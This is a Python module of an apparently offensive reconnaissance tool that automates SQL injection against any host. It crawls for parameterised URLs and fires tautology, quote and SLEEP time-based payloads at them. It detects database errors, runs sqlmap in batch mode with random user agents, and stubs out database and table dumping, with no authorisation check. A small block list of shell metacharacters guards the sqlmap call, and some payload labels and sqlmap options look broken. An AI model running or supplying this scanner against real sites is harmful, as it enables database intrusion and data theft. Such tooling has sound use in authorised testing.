#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AutoRecon v3.0 - 智能 SQL 注入扫描模块
集成 sqlmap，自动化检测和利用 SQL 注入漏洞
"""

import asyncio
import re
import urllib.parse
from typing import List, Dict, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
import json

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.async_engine import AsyncHTTPClient


class InjectionType(Enum):
    """注入类型"""
    ERROR_BASED = "error_based"
    TIME_BASED = "time_based"
    BOOLEAN_BASED = "boolean_based"
    UNION_BASED = "union_based"
    STACKED = "stacked"


@dataclass
class SQLInjectionResult:
    """SQL注入结果"""
    url: str
    parameter: str
    injection_type: InjectionType
    dbms: str = ""
    database: str = ""
    user: str = ""
    version: str = ""
    payload: str = ""
    risk: str = "high"
    description: str = ""
    data: Dict = field(default_factory=dict)


class IntelligentSQLiScanner:
    """智能 SQL 注入扫描器"""
    
    def __init__(self, target: str, threads: int = 10):
        self.target = target
        self.threads = threads
        self.results: List[SQLInjectionResult] = []
        self.test_urls: List[str] = []
        
        # SQL 错误特征
        self.error_patterns = {
            'MySQL': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"MySqlException",
                r"mysqli_",
                r"mysql_fetch",
            ],
            'PostgreSQL': [
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_",
                r"pg_query\(\)",
                r"pg_connect\(\)",
            ],
            'Oracle': [
                r"ORA-\d{5}",
                r"Oracle.*Driver",
                r"oracle.*error",
            ],
            'MSSQL': [
                r"Microsoft SQL Server",
                r"Driver.*SQL[\-\s]*Server",
                r"SQL Server.*Driver",
                r"SQLServer.*Exception",
            ],
            'SQLite': [
                r"SQLite3::SQLException",
                r"sqlite3\.OperationalError",
                r"sqlite_query\(\)",
            ],
            'Access': [
                r"Microsoft Access Driver",
                r"JET Database Engine",
            ],
        }
        
        # 常见注入点参数名
        self.common_params = [
            'id', 'page', 'cat', 'category', 'product', 'item',
            'user', 'username', 'uid', 'userid', 'member',
            'news', 'article', 'post', 'thread', 'topic',
            'search', 'query', 'keyword', 'q', 's',
            'file', 'path', 'dir', 'folder',
            'order', 'sort', 'by', 'field',
            'date', 'year', 'month',
            'debug', 'test',
        ]
    
    async def _discover_injection_points(self) -> List[str]:
        """发现可能的注入点"""
        print("[\u001b[36m*\u001b[0m] 发现注入点...")
        
        injection_points = []
        
        # 基础 URL
        base_url = f"http://{self.target}"
        
        # 从首页提取链接
        try:
            async with AsyncHTTPClient() as client:
                resp = await client.get(base_url)
                body = resp.get('body', '')
                
                # 提取带参数的 URL
                url_pattern = r'href=["\']([^"\']*\?[^"\']*)["\']'
                urls = re.findall(url_pattern, body, re.IGNORECASE)
                
                for url in urls:
                    if url.startswith('/'):
                        url = f"http://{self.target}{url}"
                    elif not url.startswith('http'):
                        url = f"http://{self.target}/{url}"
                    
                    # 只保留同域名且有参数的 URL
                    if self.target in url and '?' in url:
                        injection_points.append(url)
        
        except Exception as e:
            pass
        
        # 添加常见路径
        common_paths = [
            '/', '/index.php', '/index.html',
            '/page.php', '/detail.php', '/view.php',
            '/product.php', '/item.php', '/news.php',
            '/article.php', '/user.php', '/profile.php',
            '/search.php', '/api/', '/api/v1/',
        ]
        
        for path in common_paths:
            # 为每个路径添加常见参数
            for param in self.common_params[:5]:
                url = f"http://{self.target}{path}?{param}=1"
                if url not in injection_points:
                    injection_points.append(url)
        
        # 去重
        injection_points = list(set(injection_points))
        
        print(f"[\u001b[32m+\u001b[0m] 发现 {len(injection_points)} 个潜在注入点")
        return injection_points
    
    async def _quick_sqli_test(self, url: str) -> Optional[Dict]:
        """快速 SQL 注入检测"""
        
        # 解析 URL
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return None
        
        # 测试 payloads
        payloads = [
            ("'", "单引号"),
            ('"', "双引号"),
            ("'", "单引号+注释"),
            ('"', "双引号+注释"),
            (" OR 1=1--", "布尔 OR"),
            (" OR 1=1#", "布尔 OR #"),
            (" AND 1=1--", "布尔 AND"),
            ("' OR '1'='1", "字符串 OR"),
            ("1' AND '1'='1", "字符串 AND"),
            ("1 OR 1=1", "数字 OR"),
            ("-1 OR 1=1", "负数 OR"),
            ("1 AND 1=1", "数字 AND"),
            ("1' AND SLEEP(3)--", "时间盲注"),
            ("1 AND SLEEP(3)--", "时间盲注数字"),
        ]
        
        async with AsyncHTTPClient() as client:
            for payload, desc in payloads:
                for param_name, param_values in params.items():
                    # 替换参数值
                    test_url = url
                    original_value = param_values[0] if param_values else ""
                    
                    # 构造测试 URL
                    test_value = original_value + payload
                    test_url = url.replace(
                        f"{param_name}={urllib.parse.quote(original_value)}",
                        f"{param_name}={urllib.parse.quote(test_value)}"
                    )
                    
                    try:
                        import time
                        start_time = time.time()
                        resp = await client.get(test_url, timeout=10)
                        elapsed = time.time() - start_time
                        
                        body = resp.get('body', '')
                        status = resp.get('status', 0)
                        
                        # 检测错误信息
                        for dbms, patterns in self.error_patterns.items():
                            for pattern in patterns:
                                if re.search(pattern, body, re.IGNORECASE):
                                    return {
                                        'url': url,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'type': 'error',
                                        'dbms': dbms,
                                        'evidence': re.findall(pattern, body, re.IGNORECASE)[0] if re.search(pattern, body, re.IGNORECASE) else ""
                                    }
                        
                        # 时间盲注检测
                        if 'SLEEP' in payload.upper() and elapsed > 2.5:
                            return {
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'time',
                                'dbms': 'MySQL',
                                'evidence': f"响应延迟 {elapsed:.2f}s"
                            }
                    
                    except Exception:
                        continue
        
        return None
    
    async def _run_sqlmap(self, url: str, parameter: str) -> Optional[Dict]:
        """运行 sqlmap 进行深度检测"""
        
        try:
            # 使用 sqlmap 作为模块
            from sqlmap import api
            
            # 创建任务
            task_id = api.create_task()
            
            # 设置选项
            options = {
                'url': url,
                'parameter': parameter,
                'level': 1,
                'risk': 1,
                'technique': 'BEUST',  # Boolean, Error, Union, Stacked, Time
                'threads': 3,
                'timeout': 10,
                'batch': True,  # 非交互模式
                'randomAgent': True,
                'techniques': 'BEUSTQ',  # 所有技术
            }
            
            # 设置任务选项
            api.set_option(task_id, options)
            
            # 启动扫描
            api.start_scan(task_id)
            
            # 等待扫描完成
            import time
            max_wait = 60
            waited = 0
            while waited < max_wait:
                status = api.get_scan_status(task_id)
                if status == 'terminated':
                    break
                time.sleep(2)
                waited += 2
            
            # 获取结果
            results = api.get_scan_results(task_id)
            
            # 删除任务
            api.delete_task(task_id)
            
            if results and results.get('data'):
                return {
                    'url': url,
                    'parameter': parameter,
                    'results': results['data']
                }
        
        except ImportError:
            # 如果 sqlmap api 不可用，使用命令行
            return await self._run_sqlmap_cmd(url, parameter)
        except Exception as e:
            pass
        
        return None
    
    async def _run_sqlmap_cmd(self, url: str, parameter: str) -> Optional[Dict]:
        """使用命令行运行 sqlmap - 已添加安全验证"""
        
        import subprocess
        import tempfile
        import json
        import shlex
        
        # 安全验证
        try:
            # 验证 URL
            if not url:
                raise ValueError("URL 不能为空")
            
            parsed = urllib.parse.urlparse(url)
            if parsed.scheme not in ['http', 'https']:
                raise ValueError(f"只允许 http/https 协议")
            
            # 防止命令注入
            dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '{', '}', '<', '>', '\x00']
            for char in dangerous_chars:
                if char in url:
                    raise ValueError(f"URL 包含非法字符")
                if char in parameter:
                    raise ValueError(f"参数名包含非法字符")
            
            # 验证参数名（只允许字母、数字、下划线、连字符）
            if not re.match(r'^[a-zA-Z0-9_-]+$', parameter):
                raise ValueError(f"无效的参数名")
                
        except ValueError as e:
            print(f"[\u001b[31m!\u001b[0m] 安全验证失败: {e}")
            return None
        
        output_file = tempfile.mktemp(suffix='.json')
        
        cmd = [
            'sqlmap', '-u', url,
            '-p', parameter,
            '--level=1',
            '--risk=1',
            '--batch',
            '--random-agent',
            '--technique=BEUST',
            f'--output-dir={os.path.dirname(output_file)}',
            '--format=json',
            '--answers=crack=N,check=N',
        ]
        
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=120
            )
            
            # 解析结果
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    return json.load(f)
        
        except asyncio.TimeoutError:
            proc.kill()
        except Exception as e:
            pass
        finally:
            if os.path.exists(output_file):
                os.remove(output_file)
        
        return None
    
    async def _smart_sqli_scan(self, url: str) -> List[SQLInjectionResult]:
        """智能 SQL 注入扫描"""
        
        results = []
        
        # 第一步：快速检测
        quick_result = await self._quick_sqli_test(url)
        
        if quick_result:
            # 发现可能的注入点
            result = SQLInjectionResult(
                url=quick_result['url'],
                parameter=quick_result['parameter'],
                injection_type=InjectionType.ERROR_BASED if quick_result['type'] == 'error' else InjectionType.TIME_BASED,
                dbms=quick_result.get('dbms', 'Unknown'),
                payload=quick_result['payload'],
                description=f"发现 {quick_result['type']} 型 SQL 注入",
                data=quick_result
            )
            results.append(result)
            
            # 第二步：使用 sqlmap 深度检测
            print(f"[\u001b[33m*\u001b[0m] 使用 sqlmap 深度检测 {quick_result['parameter']}...")
            
            try:
                sqlmap_result = await self._run_sqlmap(url, quick_result['parameter'])
                
                if sqlmap_result:
                    # 更新结果
                    for r in results:
                        if r.parameter == quick_result['parameter']:
                            r.data['sqlmap'] = sqlmap_result
                            
                            # 提取详细信息
                            sqli_data = sqlmap_result.get('results', {})
                            if sqli_data:
                                r.dbms = sqli_data.get('dbms', r.dbms)
                                r.database = sqli_data.get('database', '')
                                r.user = sqli_data.get('db_user', '')
                                r.version = sqli_data.get('db_version', '')
            
            except Exception as e:
                pass
        
        return results
    
    async def run_full_scan(self) -> List[SQLInjectionResult]:
        """完整扫描"""
        
        print("\n" + "=" * 55)
        print("\u001b[36m智能 SQL 注入扫描\u001b[0m")
        print("=" * 55 + "\n")
        
        # 发现注入点
        injection_points = await self._discover_injection_points()
        
        if not injection_points:
            print("[\u001b[33m-\u001b[0m] 未发现可能的注入点")
            return []
        
        # 并发扫描
        print(f"[\u001b[36m*\u001b[0m] 开始扫描 {len(injection_points)} 个注入点...")
        
        semaphore = asyncio.Semaphore(self.threads)
        
        async def limited_scan(url):
            async with semaphore:
                return await self._smart_sqli_scan(url)
        
        tasks = [limited_scan(url) for url in injection_points[:20]]  # 限制数量
        all_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result_list in all_results:
            if isinstance(result_list, list):
                self.results.extend(result_list)
        
        # 输出结果
        if self.results:
            print(f"\n[\u001b[31m!\u001b[0m] 发现 {len(self.results)} 个 SQL 注入点!")
            for r in self.results:
                print(f"    URL: {r.url}")
                print(f"    参数: {r.parameter}")
                print(f"    类型: {r.injection_type.value}")
                print(f"    数据库: {r.dbms}")
                print()
        else:
            print(f"\n[\u001b[32m+\u001b[0m] 未发现 SQL 注入漏洞")
        
        return self.results
    
    def get_results(self) -> List[Dict]:
        """获取结果"""
        return [
            {
                'url': r.url,
                'parameter': r.parameter,
                'type': r.injection_type.value,
                'dbms': r.dbms,
                'database': r.database,
                'user': r.user,
                'payload': r.payload,
                'risk': r.risk,
                'description': r.description,
            }
            for r in self.results
        ]


# 简化的 SQLMap 封装类
class SQLMapWrapper:
    """SQLMap 简化封装"""
    
    def __init__(self, target: str):
        self.target = target
        self.results = {}
    
    async def auto_scan(self, url: str) -> Dict:
        """自动扫描 URL"""
        
        result = {
            'vulnerable': False,
            'injections': [],
            'databases': [],
            'tables': [],
            'columns': [],
            'data': []
        }
        
        # 构造命令
        import tempfile
        output_dir = tempfile.mkdtemp()
        
        cmd = [
            'python', '-m', 'sqlmap',
            '-u', url,
            '--batch',
            '--level=1',
            '--risk=1',
            '--random-agent',
            '--technique=BEUST',
            f'--output-dir={output_dir}',
            '--flush-session',
            '--answers=crack=N',
        ]
        
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=180
            )
            
            output = stdout.decode('utf-8', errors='ignore')
            
            # 解析输出
            if 'Parameter:' in output and 'Type:' in output:
                result['vulnerable'] = True
                
                # 提取注入参数
                param_match = re.search(r'Parameter:\s+(\w+)', output)
                if param_match:
                    result['injections'].append({
                        'parameter': param_match.group(1)
                    })
                
                # 提取数据库信息
                db_match = re.search(r"web application technology:.*\nback-end DBMS:\s+(.+)", output)
                if db_match:
                    result['databases'].append(db_match.group(1).strip())
        
        except asyncio.TimeoutError:
            proc.kill()
        except Exception as e:
            pass
        
        return result
    
    async def get_databases(self, url: str) -> List[str]:
        """获取所有数据库"""
        # sqlmap --dbs
        pass
    
    async def get_tables(self, url: str, database: str) -> List[str]:
        """获取表名"""
        # sqlmap -D database --tables
        pass
    
    async def dump_table(self, url: str, database: str, table: str) -> List[Dict]:
        """导出表数据"""
        # sqlmap -D database -T table --dump
        pass


# 测试
async def main(target: str):
    scanner = IntelligentSQLiScanner(target)
    results = await scanner.run_full_scan()
    
    for r in results:
        print(f"[{r.dbms}] {r.url} - {r.parameter}")


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    asyncio.run(main(target))
